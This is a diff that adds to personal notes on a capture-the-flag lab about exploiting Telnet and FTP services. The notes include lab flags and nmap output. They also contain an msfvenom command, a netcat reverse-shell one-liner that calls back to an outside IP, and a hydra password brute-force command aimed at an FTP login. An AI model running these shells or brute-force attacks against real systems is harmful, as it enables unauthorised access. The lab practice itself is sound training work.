@@ -220,17 +220,93 @@ THM{smb_is_fun_eh?}
 #lets move to TELNET
 nmap result:
 
+Start a tcpdump listener on your local machine using: "sudo tcpdump ip proto \\icmp -i tun0" This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on
+
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+"msfvenom -p cmd/unix/reverse_netcat lhost=10.9.78.30 lport=4444 R"
+
+
+
+Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+
+"nc -lvp [listening port]" 
+
+payload:
+mkfifo /tmp/bhqtuxr; nc 10.9.78.30 4444 0</tmp/bhqtuxr | /bin/sh >/tmp/bhqtuxr 2>&1; rm /tmp/bhqtuxr
+
+
+
+
+got the flag telnet:
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+
+
+FTP:
+
+nmap scan:
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             353 Apr 24 11:16 PUBLIC_NOTICE.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.78.30
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 25.435 days (since Mon Sep 14 00:27:38 2020)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: Welcome
+
+
+
+
+PUBLIC_NOTICE.txt
+===================================
+MESSAGE FROM SYSTEM ADMINISTRATORS
+===================================
+
+Hello,
+
+I hope everyone is aware that the
+FTP server will not be available 
+over the weekend- we will be 
+carrying out routine system 
+maintenance. Backups will be
+made to my account so I reccomend
+encrypting any sensitive data.
+
+Cheers,
+
+Mike 
+hydra -t 4 -l Mike -P /root/Desktop/rockyou.txt ftp://10.10.181.212 
 
 
 
 
 
 
-
-
-
-
-
+important links:
+    https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
+    https://attack.mitre.org/techniques/T1210/
+    https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
 
 
 
